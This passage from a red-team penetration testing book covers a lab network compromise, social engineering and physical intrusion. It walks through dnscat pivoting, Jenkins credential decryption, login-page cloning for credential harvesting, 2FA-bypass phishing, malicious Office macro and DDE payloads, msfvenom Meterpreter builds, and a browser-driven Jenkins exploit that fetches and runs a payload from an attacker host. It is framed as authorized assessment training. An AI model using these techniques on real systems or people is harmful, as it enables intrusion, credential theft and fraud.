~/.ssh/id_rsa root@172.16.250.30\n \n \nYou spend some time on the second box and try to understand what it is\nused for.  Search ing around, you notice there is a Jenkins user in the /home\ndirectory , which  leads you to identify a Jenkins service running on port\n8080.  How can we use our browser to see what's on the Jenkins server? \nThis is where dnscat's port forward feature comes into play.  We need to\nback out of our initial shell and go to the command terminal.  From there,\nwe need to set up a listener to forward our traffic from our attacker\nmachine, throug h the dnscat, to the Jenkins box (172.16.250.30) over port\n8080.\n \nExecute a dnscat port forward:\nBack out of our current shell\nCtrl + z\nGo back to our first command agent and set up a listener/port\nforward\nwindow -i 1\nlisten 127.0.0.1:8080 172.16.250.30:8080\nOn your THP Kali VM, go to a browser and use our port\nforward (it will be very slow over DNS):\nhttp://127.0.0.1:8080/jenkins\n \n \nInside the crede ntial manager within the Jenkins app, we are going to see\nthat the db_bac kup user password is stored, but not visible.  We need to\nfigure out a way to get this credential out of Jenkins, so that we can\ncontinue to move laterally .\n \n \nn00py did some great research on stored credentials within Jenkins and how\nto extract them (http://bit.ly/2GUIN9s).  We can take advantage of this\nattack using our existing shell and to grab the credentials.xml, master .key,\nand hudson.util.Secret files.\n \nGo back to the main menu in dnscat and interact with your\noriginal shell\nCtrl + z\nwindow -i 2\nGo to the Jenkins' home directory and grab the three files:\ncredentials.xml, master .key, and hudson.util.Secret.\ncd /home/Jenkins\nWe can either try to download these files of f or we could base64\nthese files and copy them of f via the current shell.\nbase64 credentials.xml\nbase64 secrets/hudson.util.Secret\nbase64 secrets/master .key\nWe can copy the base64 output back onto our Kali box and\ndecode them to reverse the password for the db_backup user .\ncd /opt/jenkins-decrypt\necho \"<base64 hudson.util.Secret>\" | base64 --decode\n> hudson.util.Secret\necho \"<base64 master .key >\" | base64 --decode >\nmaster .key\necho \"<base64 credentials.xml >\" | base64 --decode >\ncredentials.xml\nDecrypt the password using https://github.com/cheetz/jenkins-\ndecrypt\npython3 ./decrypt.py master .key hudson.util.Secret\ncredentials.xml\n \n \nWe were able to successfully decrypt the db_backup user's password of\n\")uDvra{4UL^;r?*h\".  If we look back at our earlier notes, we see in the\nOpenCMS properties file that the database server was located on\n172.16.250.50.  It looks like this Jenkins server , for some reason, performs\nsome sort of backup against the database server .  Let's check if we can take\nour credentials of db_backup: )uDvra{4UL^;r?*h to log into the database\nserver via SSH.  The only proble m is that through our dnscat shell, we don't\nhave direct standard input (STDIN) to interact with SSH's password\nprompt.  So, we will have to use our port forward again to pass our SSH\nshell from our THP Kali VM, through the dnscat agent, to the database\nserver (172.16.250.50).\n \nGo back to the command shell\nCtrl + z\nwindow -i 1\nCreate a new port forward to go from localhost to the database\nserver at 172.16.250.50\nlisten 127.0.0.1:2222 172.16.250.50:22\n \n \nOnce on the database server (172.16.250.50) with the db_backup account,\nwe notic e that this account is part of the sudoers file and can sudo su to\nroot.  Once root on the database  server , we poke around, but can't find any\ncredentials to access the databa se.  We could reset the root DB password,\nbut that might end up breaking some of the other applications.  Instead, we\nsearch for the different databases located under /var/lib/mysq l and come\nacross a cybersp acekittens datab ase.  Here, we find the secrets.ibd file that\nholds all the data for the secret s table.  As we read through the data, we\nrealize that it might be encrypted…  It is up to you to figure out the rest…\n \n \nCongrats!!!  You have successfully compromised the Cyber Space Kittens\nnetwork! \n \nDon't stop here… There are many things you can do with these boxes; we\nhave only touched the surface.  Feel free to play around on these systems,\nfind more sensitive files, figure out other ways to privilege escalate, and\nmore.  For reference, in this lab, the environment topology is represented\nbelow:\n \n \nConclusion\nIn this chapter , we went throug h Compromising the Network.  We started\neither on the network with no credentials or social engineered  our way to\nour first victim box.  From there, we were able to live off the land, gain\ninformation about the network/systems, pivot around boxe s, escalate\nprivileges, and ultimately comp romise the whole network.  This was all\naccomplished with minimal scanning, using features of the network, and\ntrying to evade all sources of detection. \n \n \n \n \n \n \n \n \n \n \n \n5 the screen - social engineering\n \n \n \n \nBuilding Your Social Engineering (SE) Campaigns\nAs Red Teamers, we love social engineering (SE) attacks.  Not only\nbecause it can generally compri se of low skillset attacks, but because it is\nalso easy to craft a highly trustworthy campaign at very low cost.  Just set\nup a couple of fake domains, servers, craft some emails, drop some USB\nsticks, and call it a day . \n \nIn terms of metrics, we capture the obvious things like the number of emails\nsent, number of users who clicked on the link, and number of users that\ntype in their password.  We also try to get creative and bring substantive\nvalue to the companies who hire us.  An example of this is DefCon’ s Social\nEngineering Competition, where competitors social engineer call centers\nand employees.  If you aren't familiar with this competition, these\ncompetitors have a limited amount of time to find a number of flags based\non the company .  Flags can be captured by gaining company information\nsuch as their VPN, what type of AV they use, emplo yee-specific\ninformation, or being able to get an employee to visit a URL, and more.  If\nyou want to see all the flags used in the competition, check out the 2017\ncompetition report: http://bit.ly/2HlctvY .  These types of attack s can help a\ncompany increase internal awar eness by teaching their employees how to\nspot evil and report them to the proper teams. \n \nIn this chapter , we are going to lightly touch on some of the tools and\ntechniques we use to run our campaigns.  W ith SE style attacks, there are no\nright or wrong answers.  As long as they work, it's all good in our book.\n \nDoppelganger Domains\nWe talked a lot about this in THP2.  This is still one of the most successful\nways to get that initial credential or drop malware.  The most common\ntechnique is to purchase a domain that is very similar to a company’ s URL\nor is a common mistype of their URL.\n \nIn the last book, we had an example where if we had\nmail.cyberspacekittens.com, we would purchase the domain\nmailcyberspacekittens.com and set up a fake Outlook page to capture\ncredentials.  When the victim s go to the fake site and type in their\npassword, we would collect that data and redirect them to the company's\nvalid email server (mail.cyberspacekittens.com).  This gives them the\nimpression that they just accidentally mistyped their password the first time\nand therefore proceed with their login once more. \n \nThe best part of all of this is that you don't really have to do any phishing. \nSomeone will mistype or forget the period (.) between “mail” and\n“cyberspacekittens”, then type in their credentials.  We have had victims\nbookmark our malicious site and come back every day . \n \nHow to Clone Authentication Pages\nOne of the best tools to quickly  clone web application authentication pages\nis the Social Engineering Toolkit (SET) by TrustedSec.  This is a standard\ntool for any SE campaign wher e gaining credentials is a priority .  You can\ndownload SET at https://github.com/trustedsec/social-engineer -toolkit. \n \nSetting Up SET\nConfigure SET to Use Apache (versus the default Python)\nModify the config file to the following\ngedit /etc/setoolkit/set.config\nAPACHE_SER VER=ON\nAPACHE_DIRECT ORY=/var/www/html\nHAR VESTER_LOG=/var/www/html\nStart Social Engineering T oolkit (SET)\ncd /opt/social-engineer -toolkit\nsetoolkit\n1) Spear -Phishing Attack V ectors\n2) W ebsite Attack V ectors\n3) Credential Harvester Attack Method\n2) Site Cloner\nIP of your attacker server\nSite to Clone\nOpen a Browser and go to your attacker server and test\n \nAll files will be stored under /var/www/html and passwords under\nharvester*.  Some best practices when cloning pages for Social Engineering\ncampaigns:\nMove your Apache server to run over SSL\nMove all images and resources  locally (instead of calling from\nthe cloned site)\nPersonally , I like to store all recorded passwords with my public\npgp key.  This way, if the server  is compromised, there is no way\nto recover the passwords withou t the private key.  This can all be\nsupported with PHP gnupg_encrypt and gnupg_decrypt.\n \nCredentials with 2F A\nWe are seeing more customers with two factor authentication (2FA). \nAlthough 2FA is a big pain for Red Teams, they aren't impossible to get\naround.  Historically , we have had to create custom pages that would handle\nsome of this, but now we have ReelPhish.  ReelPhish, a tool made by\nFireEye, allows a Red Team to utilize Selenium and Chrome to trigger the\n2FA automatically when a victim enters credentials on our phishing page. \n \nReelPhish https://github.com/fireeye/ReelPhish:\nClone victim site that requires 2F A authentication\nOn your own Attacker Box, parse the traf fic required to log into\nthe real site.  In my case, I open Burp Suite and get all the post\nparameters required to authenticate\nModify the Clone Site so that it uses ReelPhish.  See the .\n/examplesitecode/samplecode.php and input all the necessary\nparameters your authentication requires\nVictim falls for cloned site and authenticates\nCredentials are pushed back to the attacker\nReelPhish will authenticate to the Real Site, triggering 2F A\nVictim receives 2F A code or phone push\nVictim is redirected to the real site to log in again (thinking they\nfailed the initial time)\n \nAs reflected in the following image, we should now have an authenticated\nsession bypassin g 2FA.  Althou gh it does looks like it supports Linux, I\nhave had some issues getting it to run in Kali.  Running it in Windows is\npreferred.  You can find more information on ReelPhish on FireEye's\nWebsite: https://www .fireeye.com/blog/threat-research/2018/02/reelphish-\nreal-time-two-factor -phishing-tool.html. \n \n \nThere are a few other tools that handle dif ferent 2F A bypasses as well:\nhttps://github.com/kgretzky/evilginx\nhttps://github.com/ustayready/CredSniper\n \nOne thing I want to mention about authenticating to 2FA resources is to\nmake sure you verify all the different authentication methods once you have\ncredentials.  What I mean by this is that they may have 2FA for the web\nauthentication portal, but it might not be required for APIs, older thick\nclients, or all application endpoints.  We have seen many applications\nrequire 2FA on common endpoi nts, but lack the security protect ion on other\nparts of the application.\n \nPhishing\nAnother techniq ue where Red Teams have great success is traditional\nphishing.  Phishing, at its core, relies on either fear, urgency , or something\nthat just sounds too good to be true.   Fear and urgency do work well and I\nam sure we have all seen it before.  Some examples of fear and urgency\ntypes of attacks include:\nA fake email with a fraudulent purchase\nSomeone hacked into your email message\nEmail about tax fraud\n \nThe issue with these general attacks is that we are noticing that corporate\nemployees are getting smarter and smarter .  Usually , at least 1 out of every\n10 emails for basic phish style attack will get reported.  In some cases, the\nnumbers are much higher .  This is where it is valuable for a Red Team to\ncontinually monitor these easy phish attacks to see if a company is getting\nbetter at responding to these situations.\n \nFor those looking for more automated attacks, we really like Gophish\n(http://getgophish.com/documentation/).  It is fairly easy to set up and\nmaintain, supports templates and HTML, and tracks/documents  everything\nyou need.  If you are a fan of Ruby , there is also Phishing Frenzy\n(https://github.com/pentestgeek/phishing-frenzy); and for Python, there is\nKing Phisher (https://github.com/securestate/king-phisher). \n \nThese automated tools are great for recording straightforward phishing\ncampaigns.  For our target campaigns, we go with a more manual\napproach.  For example, if we do some reconnaissance on the victim's mail\nrecords and identify that the client is using Office 365, then we can figure\nout how to build a very realistic campaign with that information. \nAdditionally , we try to find any leaked emails from that company , programs\nthey might be running, new features, system upgrades, mergers, and any\nother information that might help. \n \nThere are also times when we run more targeted executive campaigns.  In\nthese campaigns, we try to use all the open source tools to search for\ninformation about people, their properties, families and more.  For example,\nif targeting an executive, we would search them on pipl.com, get their\nsocial media accounts, find out where their kids go to school, and spoof an\nemail from their school saying they need to open this word document. \nThese take a fair amount of time, but have high success rates.\n \nMicr osoft W ord/Excel Macr o Files\nOne of the older, but tried and tested, methods of social engineering is\nsending your victim a malicious  Microsoft Office file.  Why are Office files\ngreat for a malicious payload?   Because by default, Office files support\nVisual Basic for Applications (VBA) code that allows for code execution. \nAlthough, more  recently , this method has become easily detected by AV, it\nstill works in many cases with obfuscation. \n \nAt the most basic level, we can use either Empire or Unicorn to create a\nVBA Macro:\nIn Empire:\nSelect Macro Stager\nusestager windows/macro\nMake sure to configure the proper settings\ninfo\nCreate the Macro\ngenerate\nIf you want to create a Payload for Meterpreter , we can use a\ntool like Unicorn:\ncd /opt/unicorn\n./unicorn.py windows/meterpreter/reverse_https\n[your_ip] 443 macro\nStart a Metasploit Handler\nmsfconsole -r ./unicorn.rc\n \nOnce generated, your payload will look something like the following:\n \n \nAs you can see, this is running a simple PowerShell base64 obfuscated\nscript.  This can help get around some AV products, but it is important to\nmake sure you test it well prior to going on a live campaign.  Once you\ngenerate a macro, you can create a quick Excel document:\nOpen Excel\nGo to the V iew T ab -> Macros -> V iew Macros\nAdd a Macro Name, configure the Macro for book1, and click\nCreate\n \nReplace all the current Macro code with the generated code\nSave as .xls (W ord 97-2003) or Excel Macro-Enabled\n \n \nNow , whenever  anyone opens your document, they will get a Security\nWarning and a button to Enable Content.  If you can trick your victim into\nclicking the Enable Content button, your PowerShell script will execute,\ngetting you an Empire Shell.\n \n \nAs previously mentioned, the Macro method is the old, tried and tested\nmethod, so many victims may already be aware of this attack.  Another\nroute we can take with Office Files is embedding a batch file (.bat) with our\npayload.  In the newer version of Office, objects will not execute if the\nvictim double clicks the .bat file within the Word document.  We usually\nhave to try to trick them to move it over to their desktop and execute.\n \n \n \nWe can do this in a more automated fashion with LuckyStrike\n(https://github.com/curi0usJack/luckystrik e).  With LuckyS trike, we can create Excel\ndocuments with our Payload within the worksheets and even have full\nexecutables (exes) stored inside  Excel documents, which can be triggered\nusing ReflectivePE to run all in memory .  Read more on LuckyStrike here:\nhttps://www .shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-\ngenerator\n \nOne last tool I want to ment ion for Office File executables is VBad\n(https://github.com/Pepitoh/VBa d).  Whe n running VBad, you do have to enable\nmacros in Of fice and select the checkbox “T rust Access to the VBA\nproject object model” in the macro security settings. This allow s the VBad\npython code to change and create macros. \n \nVBad heavily obfuscates your payloads within the MS Office document.  It\nalso adds encryption, has fake keys to throw off IR teams, and best of all, it\ncan destroy the encryption key after the first successful run (a one-time use\nMalware).  Another feature is that VBad can also destroy references to the\nmodule containing ef fective payload in order to make it invisible from VBA\nDeveloper Tool.  This makes analysis and debugging much harder.  So, not\nonly is it a total pain to reverse, but also if the incident response teams try to\nanalyze the executed Word document versus the original document, all the\nkeys will be missing.\n \nNon-Macr o Office Files - DDE\nOne thing about Red Team attac ks is that sometimes it is all about timing. \nDuring one of our assessments, a brand new vulnerable called DDE was\nfirst announced.  It wasn't yet detected by AV or any security product, so it\nwas a great way to get our initial entry point.  Although there are now\nseveral security products to detect DDEs, it could still be a viable attack in\nsome environments.\n \nWhat is DDE?\n\"Windows provides several methods for transferring data between\napplications. One method is to use the Dynamic Data Excha nge (DDE)\nprotocol. The DDE protocol is a set of messages and guidelines. It sends\nmessages between applications that share data and uses shared  memory to\nexchange data between applications. Applications can use the DDE\nprotocol for one-time data trans fers and for continuous exchanges in which\napplications send updates to one another as new data becomes available.”\n[https://msdn.microsoft.com/en-\nus/library/windows/desktop/ms648774(v=vs.85).aspx] \n \nThe team at Sensepost did some great research and discovered that\nDDEExecute was exposed by both MSExcel, and MSW ord, and that they\ncould be used to create code execution without the use of Macros.\n \nIn W ord:\nGo to Insert T ab -> Quick Parts -> Field\nChoose = Formula\nRight click on: !Unexpected End of Formula and select T oggle\nField Codes\nChange the payload to your payload:\nDDEAUT O c:\\\\windows\\\\system32\\\\cmd.exe \"/k\npowershell.exe [empire payload here]\"\n \nEmpire has a stager that will auto-create the Word file and associated\nPowerShell script.  This stager can be configured by:\nusestager windows/macroless_msword\n \n \nResources:\nhttps://sensepost.com/blog/2017/macro-less-code-exec-in-\nmsword/\n \nAre there any other features to abuse in Word documents other than 0-day\nexploits (i.e. https://github.com/bhdresh/CVE-2017-0199)?  The answer is\nyes.  Although we won’ t cover it in this book, an example would be subdoc\nattacks (https://rhinosecuritylabs.com/research/abusing-microsoft-word-\nfeatures-phishing-subdoc/).  These attacks cause the victim to make an\nSMB request to an attacker server on the internet in order to collect NTLM\nauth hashes.  This may or may not work, as most corporations now block\nSMB related ports outbound.  For those that don't, we can use the\nsubdoc_inector (http://bit.ly/2qx OuiA) attack to take advantage of this\nmisconfiguration. \n \nHidden Encrypted Payloads\nAs Red Teamers, we are always looking for creative ways to build our\nlanding pages, encrypt our payloads, and to trick users into clicking run. \nTwo different tools with similar processes are EmbededInHTML and\ndemiguise. \n \nThe first tool, EmbededInHTM, \"takes a file (any type of file), encrypt it,\nand embed it into an HTML file as resource, along with an automatic\ndownload routin e simulating a user clicking on the embedded resource. \nThen, when the user browses the HTML file, the embed ded file is\ndecrypted on the fly, saved in a temporary folder , and the file is then\npresented to the user as if it was being downloaded from the remote site.\nDepending on the user's browse r and the file type presented, the file can be\nautomatically opened by the browser .\" \n[https://github.com/Arno0x/EmbedInHTML]\n \ncd /op/EmbedInHTML\npython embedInHTML.py -k keypasshere -f meterpreter .xll -o\nindex.html -w\n \n \nOnce the victim  accesses the malicious site, a pop-up prompts the victim to\nopen our .xll file in Excel.  Unfortunately , with the more recent versions of\nExcel (unless misconfigured), the user will need to Enable the add-on to\nexecute our payload.  This is where your social engineering tricks need to\ncome into play .\n \nThe second tool, demiguise, \"generates .html files that contain an encrypted\nHTA file. The idea is that when your target visits the page, the key is\nfetched and the HTA is decry pted dynamically within the browser and\npushed directly to the user. This is an evasion technique to get around\ncontent / file-type inspection implemented by some security-appliances.\nThis tool is not designed to create awesome HTA content. There are other\ntools/techniques that can help you with that. What it might help you with is\ngetting your HTA into an environment in the first place, and (if you use\nenvironmental keying) to avoid it being sandboxed.\"\n[https://github.com/nccgroup/demiguise]\npython demiguise.py -k hello -c \"cmd.exe /c\n<powershell_command_here>\" -p Outlook.Application -o\ntest.hta\n \nExploiting Internal Jenkins with Social\nEngineering\nAs Red Teamers, creativity in attacks is what makes our work extremely\nexciting.  We like to take old exploits and make them new again.  For\nexample, if you have been perfo rming network assessments, you know that\nif you come across an unauthenticated Jenkins application (heavily used by\ndevelopers for continuous integration), it pretty much means full\ncompromise.  This is because it has a \"feature\" that allows Groovy script\nexecution for testing.  Utilizin g this script console, we can use execute\ncommands that allow shell access to the underlying system. \n \n \nThe reason this method has become so popular for compromise is that\nalmost every major company has some instances of Jenkins.  The problem\nwith an external  attack is that these Jenkins services are all hosted internally\nand can't be reached from the outside. \n \nHow could we execute code on those servers remotely?  Before we can\nanswer this question, I tell my team to take a step back and build a replica\nnetwork with Jenkins for testin g.  Once we have a good under standing of\nhow code execu tion requests function, we can now build the proper tools to\ngain RCE. \n \nIn this case, we solved this problem through a multitude of steps using\nJavaScript and WebRTC (Web Real-T ime Communications).  First, we\nwould need a victim of an organization to visit a public website we own or\na page where we have our stored XSS payload.  Once a victim visits our\npublic site, we would execute JavaScript on their browser to run our\nmalicious payload. \n \nThis payload would abuse a Chrome/Firefox \"feature\" which allows\nWebRTC to expose the internal IP of a victim.  With the interna l IP, we can\nthen deduce the local subnet of the victim machine to unde rstand their\ncorporate IP ranges.  Now , we can blast every IP in their network range (the\ncode only scans  the local /24, but in a real campaign, you would want to\nmake it much larger than that) with our specially-crafted Jenkins exploit\nover the default Jenkins port 8080.\n \nThe next question is, what payload do we use?  If you have played around\nwith the Jenkins  Console shell, you know it is a little finicky , so being able\nto get complex PowerShell payloads consistently might be tough.  To solve\nthis problem, a tool was created for THP3 called\n\"generateJenkinsExploit.py\"\n(https://github.com/cheetz/generateJenkinsExploit), which will take any\nbinary file, encrypt it, and build the malicious attack JavaScript page. \nWhen a victim hits our malicious webpage, it will grab their internal IP and\nstart spraying our exploit to all servers in the /24 range.  Whe n it finds a\nvulnerable Jenkins server , the attack will send a Groovy script  payload to\ngrab the encrypted binary from the internet, decrypt it to a file under\nC:\\Users\\Public\\R T.exe and execute the Meterpreter binary (R T.exe). \n \nIn concept (diagramed below), this is very similar to a Server Side Request\nForgery (SSRF) , where we are forcing the victim's browser to re-initiate our\nconnections to internal IPs.\n \nVictim visits our stored XSS or malicious JavaScript Page.\nVictim's browse r executes JavaScript/W ebRTC to get internal IP\nand blast the local internal netw ork with Groovy POST Payload.\nUpon finding a Jenkins server , our Groovy code will tell the\nJenkins server to grab the encry pted payload from the attacker's\nserver , and then decrypt and execute the binary . \nIn this case, our encrypted executable that is downloaded is a\nMeterpreter payload.\nMeterpreter executes on the Jenkins server , which then connects\nto our Attacker Meterpreter Server .\n \n \n \n \nNote: This vulnerability does not exist in the latest versions of Jenkins.\nVersions befor e 2.x are vulnerab le by default as they did not enable CSRF\nprotection (allowing for this blind call to /script/) and did not have\nauthentication enabled.\n \nFull Jenkins Exploitation Lab:\nWe are going to build out a Jenkins W indow server , so that we\ncan repeat this attack.\nInstall a W indows VM that has a Bridged Interface on your local\nnetwork\nOn W indows system, download and install JA VA JDK8\nDownload Jenkins W ar File\nhttp://mirrors.jenkins.io/war -stable/1.651.2/\nStart Jenkins\njava -jar jenkins.war\nBrowse to Jenkins\nhttp://<Jenkins_IP>:8080/\nTest the Groovy Script Console\nhttp://<Jenkins_IP>:8080/script\n \nExploit Jenkins on the THP Kali VM:\nDownload the THP Jenkins Exploit T ool (http://bit.ly/2IUG8cs)\nTo perform the lab, we first need to create a Meterpreter payload\nmsfvenom -p windows/meterpreter/reverse_https\nLHOST=<attacker_IP> LPOR T=8080 -f exe >\nbadware.exe\nEncrypt our Meterpreter binary\ncd /opt/generateJenkinsExploit\npython3 ./generateJenkinsExploit.py -e badware.exe\nCreate our malicious JavaScript Page called badware.html\npython3 ./generateJenkinsExploit.py -p\nhttp://<attacker_IP>/badware.exe.encrypted >\nbadware.html\nMove both the encrypted binary and malicious JavaScript page\nto the web directory\nmv badware.html /var/www/html/\nmv badware.exe.encrypted /var/www/html/\n \n \nNow , on a completely different system, visit your attacke r webpage\nhttp://<attacker_IP>/badware.html using either Chrome or Firefox.  Just by\nvisiting that malicious page, your browser blasts your internal /24 network\nover port 8080 with our Groovy payload using JavaScript and POST\nrequests.  When it finds a Jenkins server , it will cause that server to\ndownload our encrypted Mete rpreter , decrypt it, and execute it.  On a\ncorporate network, you may end up with tons of dif ferent shells.\n \n \nJenkins is just one of the many attacks you can do.  Anything that allows\ncode execution unauthenticated by a GET or POST HTTP method could be\nused in this same scenario.  This is where you need to identify what\napplications our victims utilize internally and craft your malicious exploit.\n \nC o n c l u s i o n\nSocial engineering is one of those areas that will always be a cat and mouse\ngame.  We rely heavily on the human factor and target weaknesses of fear,\nurgency , and trust.  By taking advantage of these vulnerabilit ies, we can\ncreate very clever campaigns that have a high success rate on system\ncompromise. \n \nIn terms of metrics and goals, we need to move away from a reactive model\nof waiting for users to report phishing/SE emails, to a proactive model\nwhere we can hunt actively for these types of malicious attacks. \n \n \n \n \n \n \n \n6 the onside kick - physical attacks\n \n \n \n \nAs part of the security assessment, CSK has asked your team to do a\nphysical assessm ent of the facility.  This entails checking if their gates and\nprotections are adequate, and if able to get on the premises, validating how\nthe guards react and their response times.\n \n*Quick note:  Please make sure to check with local, state, and federal laws\nprior to doing any physical assessments.  For example, in Mississippi, Ohio,\nNevada, or Virginia, just having  lock picks could be considere d illegal.  I\nam not a lawyer , so it would be wise for you to consult with one first.  Also,\nensure you have proper approva l, work with the facility's physi cal security\nteams, and have a signof f paper in case you get caught.  Prior to the actual\nengagement, work with the physical security team to discuss what happens\nif security guards catch you, if you can run or if you have to stop, and if\nthere is someone monitoring the radios.  Also, make sure the guards do not\ncontact local law enforcement.  The last thing you want is to actually go to\njail. \n \nNow , it's time to break into the Cyber Space Kittens' secret facility .  Per the\nwebsite, it looks like it is located on 299792458 Light Dr.  After we do\nsome reconnaiss ance on Google street, we notice that this facility is gated\nand has a guard  shack or two.  We can identify multiple entry  points and\nareas where we might be able to get over the fence.  With an initial\nwalkthrough, we also identify some cameras, gates, entry points, and card\nreader systems.\n \nCard Reader Cloners\nCard reader cloners were heavil y covered in THP2, so I will mainly go into\nupdates.  For the most part, HID badges that don't require any public/private\nhandshakes are still vulnerable to clone and bruteforce ID numbers. \n \nIn THP2, we loved cloning ProxCard II badges as they don't have any\nprotections, can be cloned easily , and cards are generally purchased in bulk\nincrementally , which allow for easy bruteforcing.  This was all done using\nthe Prox mark3 device.  Since then, a much more portable version of this\ndevice has been release d called Proxmark3 RDV2 Kit\n(http://hackerwarehouse.com/product/proxmark3-rdv2-kit/).  This version\ncan be configured with a battery and is much smaller than the original\nProxmark3.\n \nOther common cards we come across:\nHID iClass (13.56 MHz)\nHID ProxCard (125 kHz)\nEM4100x (125 kHz)\nMIFARE Classic (13.56 MHz)\n \nHere is a great resource  to check out by Kevin Chung:\nhttps://blog.kchung.co/rfid-hacking-with-the-proxmark-3/.  \n \nPhysical Tools to Bypass Access Points\nWe won't get into physical tools and how-tos, as that is an entire book and\nrequires a great deal of experience.  As always, the best way to do physical\nassessments is to practice, build physical labs, and figure out what works\nand what doesn't.  In terms of some cool tools that we have used in the past:\n \nLock Picks (https://www .southord.com/) - SouthOrd has always\nbeen our go-to for lock picks.  Great quality and works well.\nGate Bypass Devices (https://www .lockpickshop.com/GA TE-\nBYPASS.html) - T ool for getting around locked gates.\nShove-it T ool (https://www .lockpickshop.com/SJ-50.html) -\nSimple tool if there is adequate space been a door and the latch. \nSimilar to the credit card swipe to open doors, you use the\nshove-it tool to go behind the plunger and pull back.\nUnder the Door 2.0 (https://shop.riftrecon.com/products/under -\nthe-door -tool) – T ool for doors that have the lever handle. We\ncan use the Under the Door tool to literally go under the door ,\nwrap around the lever handle, and pull down.  Back in the day ,\nthese were commonly found in hotels, but we definitely do come\nacross them in businesses, too.\nAir Canisters - A cheap and easy tool to get around doors that\nunlock with motion sensors on the inside.  Check out this video\nto see Samy Kamkar bypass these types of doors:\nhttps://www .youtube.com/watch?v=xcA7iXSNmZE\n \nRemember , the purpose of these  tools and physical assessments is to track\nand monitor how a company's physical security program respon ds.  So it is\nour job to make sure we adequately document not only flaws in the system,\nbut also if the response times and handling of the incident were acceptable.\n \nLAN T urtle (lanturtle.com)\nThe LAN Turtle is one of my favorite tools from Hak5.  In the prior books,\nwe have looked into Raspberry Pi and ODROID small form factors for drop\nboxes.  Running Kali Linux on these devices and having them either SSH\nor VPN back into our attacker machines was a great way to do physical\npenetration tests. \n \nThese drop boxes have continued to evolve through the years.  Now , the\nLAN Turtle is one that can be hidden behind any machine, powered by\nUSB, and transparent to the user.  The LAN Turtle uses the USB as a NIC\ncard and proxies all traf fic through the Ethernet cable. \n \nThere is also a 3G cellular edition, but we won't be demonstratin g that here.\n \nSetting up the LAN T urtle:\nSo the LAN Turtle's purpose is to replace the dropbox.  Although it has a\nload of other features like autossh, dns spoofing, meterpreter , ptunnel,\nscript2email, urlsnarf, responde r, and more, the main Red Team use is to\ngain access into the network. \n \nHistorically , and even in prior THP books, we used SSH reverse shells. \nThese generally work adequately , but for more in-depth scanning/complex\nattacks, we need full access into the network.  To do this, we are going to\nhave to configu re a Reverse VPN connection.  What does a reverse VPN\nconnection look like?\n \nWell, since the LAN Turtle will be dropped on the back of one of the\ndesktops inside an organization, we won't be able to directly connect to it. \nTherefore, we will have the LAN Turtle first go outbound via port 443 to\nVPN back to our OpenVPN AS server .  From our attacker Kali box, we will\nhave to also log into the VPN server .  Once the LAN Turtle and our\nAttacker Machine are VPNed into our server , we can route our traffic\nthrough the LAN T urtle to scan or exploit boxes.\n \n \n \nAlthough OpenVPN reverse tunnels aren't new, the team at Hak5 did a\nreally good job putting a tutorial  together .  I have had to modify some of the\nfollowing commands, but watch  their YouTube video for a more detailed\nexplanation: https://www .youtube.com/watch?v=b7qr0laM8kA.\n \nThere are three major parts to this:\nFirst, we are going to have to set up an OpenVPN AS server on\nthe internet\nSecond, we are going to have to configure the LAN T urtle\nThird, we are going to have to configure our attacker machine\n \nSetting Up A VPS OpenVPN AS Server:\nWe want to make sure that our VPN server is externally facing. \nWe generally like to host our VPN servers on VPS servers as\nthey are extremely easy and quick to set up.  As a caveat, please\ncheck with your VPS provider to make sure you are allowed to\ndo certain activities. \nTwo providers we usually see people use are Linode and\nAmazon Lightsail.  This is because these VPS providers are\nquick, cheap, and super easy to set up.  In this case, we are going\nto be using A WS Lightsail.  The other reason to pick certain\nVPS providers is because of detection of traf fic.  Using A WS, I\nknow that most likely , the victim's network will have a lot of\ntraffic to A WS servers.  This would allow me to hide within\ntheir traf fic.\nGo to Lightsail.aws.amazon.com and create a new VPS\nOnce created, go to Manage -> Networking\nAdd two Firewall TCP Ports (443 and 943)\nWe are all done creating the VPS server .  Now let's login:\nMake sure to chmod 600 your SSH keys and log into\nyour server\nssh -i LightsailDefaultPrivateKey-us-west-2.pem\nubuntu@[IP]\nAfter SSHing into the server\nGo to root:\nsudo su -\nUpdate server:\napt-get update && apt-get upgrade\nInstall OpenVPN AS.  Go here to find latest version:\nhttps://openvpn.net/index.php/access-\nserver/download-openvpn-as-sw/1 13.html?\nosfamily=Ubuntu\nCopy the link and download it onto the VPS. \nExample:\nwget\nhttp://swupdate.openvpn.or g/as/openvpn-as-\n2.1.12-Ubuntu16.amd_64.deb\nInstall OpenVPN AS:\ndpkg -i openvpn-as-2.1.12-\nUbuntu16.amd_64.deb\nDelete the current profile and configure OpenVPN:\n/usr/local/openvpn_as/bin/ovpn-init\nDuring the setup:\nMake sure to set the ADMIN UI to\nall interfaces\nSet Use local authentication via\ninternal DB to YES\nUpdate OpenVpn passwords:\npasswd openvpn\nThis is a great time to put IPT ables for port 943 to\nonly allow connections from your networks\n \nSet Up OpenVPN AS Server:\nGoto https://[IP Address of VPS server]:943/admin/\nLogin with user account \"openvpn\" and the password you just\ncreated\nIf you are using A WS Lightsail:\nGo to Server Network Settings and make sure the:\nHostname or IP Address is the right PUBLIC IP\naddress and not the PRIV ATE one\nSave and Update\nVerify authentication is set to local:\nAuthentication -> General -> Local -> Save Settings -\n> Update Server\nCreate T wo Users with Allow Auto-Login enabled (I did\nlanturtle and redteam):\nUser Management -> User Permissions\nFor each user:\nSet AllowAuto-login\nMake sure to Set Passwords for both of\nthem\nFor the lanturtle account, to allow connectivity via\nVPN, we need to enable some permissions:\nMake sure to configure/enable under User\nPermissions:\nall server -side private subnets\nall other VPN clients\n \n \nDownload OpenVPN Profiles:\nConnect to download profiles:\nhttps://[Y our VPS]:943/?src=connect\nFor each user (redteam and lanturtle)\nLogin and Download Profile - Y ourself\n(autologin profile)\nSave as turtle.ovpn and redteam.ovpn\n \nSetting Up the LAN T urtle and Initial Configuration:\nPlug in USB and Ethernet\nnmap the local network for port 22\nnmap x.x.x.x/24 -p22 -T5 --open\nSSH with root@[ip] with a password of sh3llz\nUpdate your LAN TUR TLE\nIt is important to change your MAC Address.  LAN T urtles use\nsimilar manufacturer MAC addresses, so you will want to make\nsure you look like a random device:\nChange your Mac Address\nInstall OpenVPN:\nGo to Modules -> Select -> Configure -> Directory -\nYes\nInstall openvpn\nSet up your OpenVPN Profile:\nGo back to Modules -> openvpn -> configure -> paste\neverything all from turtle.opvn and save\nWe also want to make sure that the LAN T urtle OpenVPN server\nstarts up at bootup, so we can just drop it and run:\nGo to Modules -> openvpn -> Enable\nLastly , we need to modify our Firewall Rules on our LAN\nTurtle:\nExit out of the 